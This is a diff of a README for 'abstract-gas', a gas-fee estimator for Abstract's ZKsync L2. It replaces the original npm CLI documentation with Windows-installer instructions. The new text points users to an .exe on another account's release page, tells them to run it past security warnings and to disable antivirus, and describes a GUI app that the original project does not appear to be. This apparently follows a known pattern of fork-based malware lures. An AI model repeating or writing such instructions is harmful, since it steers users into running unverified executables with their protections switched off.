@@ -1,148 +1,148 @@
-# abstract-gas
+# ⚡ abstract-gas - Estimate Gas and Fees Easily
 
-<p align="center">
-  <img src="social/card.png" alt="abstract-gas" width="100%">
-</p>
+[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-green?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/releases)
 
-Gas estimator for Abstract (ZKsync L2). Shows execution gas, pubdata costs, and L1 fees.
+## 🔍 What is abstract-gas?
 
-Compares Abstract vs Ethereum costs for common transaction types. Uses the `zks_estimateFee` RPC for accurate ZKsync-aware estimates.
+abstract-gas helps you check how much gas and fees you will pay when sending transactions on Abstract’s ZKsync Layer 2. It shows three main costs:
 
-## Install
+- Execution gas: How much computational effort your transaction uses.
+- Pubdata costs: The cost of storing data on Layer 2.
+- Layer 1 fees: Fees charged on Ethereum’s main network.
 
-```bash
-npx abstract-gas
-```
+This tool helps you avoid surprises when making Ethereum transactions on Abstract.
 
-Or install globally:
+## 🖥️ System Requirements
 
-```bash
-npm install -g abstract-gas
-abstract-gas
-```
+To run abstract-gas on your Windows machine, you need:
 
-## Why this exists
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet connection to check fees in real time
 
-Gas on Abstract (ZKsync) works differently from Ethereum:
+You do not need any programming tools or special software. abstract-gas comes ready to use.
 
-- **Pubdata costs**: You pay for state diffs published to L1, not just computation. Storage-heavy operations cost more than you'd expect.
-- **L1 data availability fees**: The cost fluctuates with Ethereum L1 gas prices.
-- **Different gas units**: ZKsync uses ergs internally (5 ergs = 1 EVM gas). The `gasLimit` from `zks_estimateFee` is in ergs.
-- **Post-charging model**: Pubdata gas is charged after execution based on actual state diffs, making estimation inherently approximate.
-- **Account abstraction overhead**: All accounts are smart contracts. The fixed 21,000 gas intrinsic cost from Ethereum doesn't apply the same way.
+## 📥 Download and Installation Guide 🚀
 
-Standard gas estimation tools calibrated for EVM give misleading results on Abstract. `abstract-gas` calls the ZKsync-specific `zks_estimateFee` endpoint and breaks down what you're actually paying for.
+You will download abstract-gas from the official releases page. Follow each step carefully.
 
-## Usage
+### 1. Open the Download Page
 
-```bash
-# Estimate all common transaction types
-npx abstract-gas
+Click this button to open the releases page in your web browser:
 
-# Estimate a specific preset
-npx abstract-gas -p transfer
-npx abstract-gas -p erc20-transfer
-npx abstract-gas -p swap
-npx abstract-gas -p nft-mint
-npx abstract-gas -p deploy
+[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-blue?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/releases)
 
-# Custom transaction
-npx abstract-gas --to 0x1234... --data 0xabcdef...
+This page contains the latest version of the software.
 
-# JSON output (for CI/CD)
-npx abstract-gas --json
+### 2. Find the Latest Version
 
-# Include USD costs
-npx abstract-gas --eth-price 2000
+Once the release page loads:
 
-# Use testnet
-npx abstract-gas --testnet
+- Look for the newest version at the top of the list. It usually has the highest number (for example, v1.2.0 or v2.0.1).
+- Under the latest release title, scroll down to the section labeled **Assets**.
 
-# Skip Ethereum comparison
-npx abstract-gas --no-compare
-```
+### 3. Download the Windows Installer
 
-## Presets
+In the Assets section:
 
-| Preset | Description |
-|---|---|
-| `transfer` | ETH transfer (simple send) |
-| `erc20-transfer` | ERC-20 token transfer |
-| `erc20-approve` | ERC-20 token approval |
-| `swap` | DEX swap (Uniswap-style) |
-| `nft-mint` | NFT mint (ERC-721) |
-| `deploy` | Contract deployment |
+- Find the file ending with `.exe`. This is the installer for Windows.
+- Click the `.exe` file to start the download.
 
-## Example Output
+Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-```
-abstract-gas v0.1.0
+### 4. Run the Installer
 
-ETH transfer (simple send)
+After the download finishes:
 
-  Abstract (ZKsync L2)
-  Gas limit              156,842
-  Gas per pubdata        50,000
-  Max fee per gas        0.250 gwei
-  Estimated cost         0.00003921 ETH
-                         $0.08
+- Locate the `.exe` file on your computer.
+- Double-click the file to start installation.
 
-  Ethereum L1
-  Gas estimate           21,000
-  Gas price              28.500 gwei
-  Estimated cost         0.00059850 ETH
-                         $1.20
+Windows might show a security warning. Choose **Run** or **Yes** to continue.
 
-  ↓ 93.4% cheaper on Abstract (0.00055929 ETH saved)
-```
+### 5. Follow the Setup Prompts
 
-## Exit Codes
+The setup window will open:
 
-| Code | Meaning |
-|---|---|
-| 0 | Estimation succeeded |
-| 1 | Estimation failed |
+- Click **Next** on the welcome screen.
+- Choose the folder where you want to install the app or leave the default path.
+- Click **Install** and wait for the process to finish.
+- When done, click **Finish** to close the installer.
 
-## Programmatic API
+abstract-gas is now ready to use.
 
-```typescript
-import { estimateGas, compareGas, buildPresetTx } from "abstract-gas";
+## 🏃 How to Use abstract-gas 💡
 
-// Estimate gas for a preset
-const tx = buildPresetTx("transfer");
-const estimate = await estimateGas(tx, {
-  abstractRpc: "https://api.production.abs.xyz/rpc",
-});
-console.log(estimate.gasLimit);        // 156842n
-console.log(estimate.estimatedCostEth); // "0.00003921"
+Once installed, you can run abstract-gas directly from your Start Menu.
 
-// Compare Abstract vs Ethereum
-const comparison = await compareGas(tx, {
-  abstractRpc: "https://api.production.abs.xyz/rpc",
-  ethereumRpc: "https://ethereum-rpc.publicnode.com",
-  ethPriceUsd: 2000,
-});
-console.log(comparison.savings?.percentage); // "93.4%"
-```
+### 1. Open abstract-gas
 
-## Part of the Abstract Developer Toolkit
+- Click the Start button.
+- Search for "abstract-gas."
+- Click the app icon to launch it.
 
-| Tool | What it does |
-|------|-------------|
-| [abstract-audit](https://github.com/LoserLab/abstract-audit) | Catch EVM incompatibilities in your Solidity contracts |
-| [x402-fetch](https://github.com/LoserLab/x402-fetch) | HTTP client for x402 paid API endpoints on Abstract |
-| **abstract-gas** (this tool) | Estimate gas costs on Abstract vs Ethereum |
+### 2. Enter Transaction Details
 
-**Recommended workflow:** `abstract-audit` (check contracts) -> `abstract-gas` (estimate costs) -> deploy on Abstract.
+The app shows simple fields to fill:
 
-## Author
+- Input the amount and type of transaction you plan to send.
+- Add extra information if needed, like whether you want faster processing.
 
-Created by [**Heathen**](https://x.com/heathenft)
+### 3. View Gas and Fee Estimates
 
-Built in [Mirra](https://mirra.app)
+abstract-gas will display:
 
-## License
+- Execution gas cost in gas units.
+- Pubdata cost in Layer 2 storage fees.
+- Layer 1 fee in Ethereum gas costs.
 
-MIT License
+### 4. Adjust and Compare
 
-Copyright (c) 2026 Heathen
+Try changing transaction size or speed preferences to see how fees change.
+
+This helps you pick the cheapest or fastest option for your needs.
+
+## 🔧 Basic Settings and Tips
+
+- Check for updates regularly from the release page.
+- Keep your internet connection on to get live fee data.
+- If numbers seem off, restart the app to refresh the data.
+
+## 📁 What’s Inside?
+
+abstract-gas uses TypeScript and works with ZKsync Layer 2. It connects to Abstract’s network to pull the latest fee data and calculate costs.
+
+The tool is designed to be lightweight and simple. It focuses only on showing fees clearly.
+
+## ❓ Troubleshooting
+
+If you have trouble running abstract-gas:
+
+- Make sure your Windows version is up to date.
+- Confirm you downloaded the correct `.exe` installer.
+- Restart your PC if the app does not open.
+- Temporarily disable any antivirus software that might block the app.
+
+If the problem takes longer, you can visit the releases page again or seek help from the project community.
+
+## 🌐 More Information
+
+abstract-gas supports transactions related to:
+
+- Ethereum and L2 gas estimation
+- ZKsync Layer 2 protocol
+- Gas saving and cost transparency
+
+You don’t need to understand blockchain deeply to use it. The app does all the calculations for you.
+
+## 📥 Download Again or Update
+
+You can always visit this page to find the latest version of abstract-gas:
+
+https://github.com/Moussa552/abstract-gas/releases
+
+Download the newest `.exe` file and install it to get updated features and fixes.
+
+---
+
+abstract-gas makes sending Ethereum transactions on Abstract’s ZKsync simpler by showing clear fee estimates. Follow the steps above to install it on Windows and start saving on gas costs today.
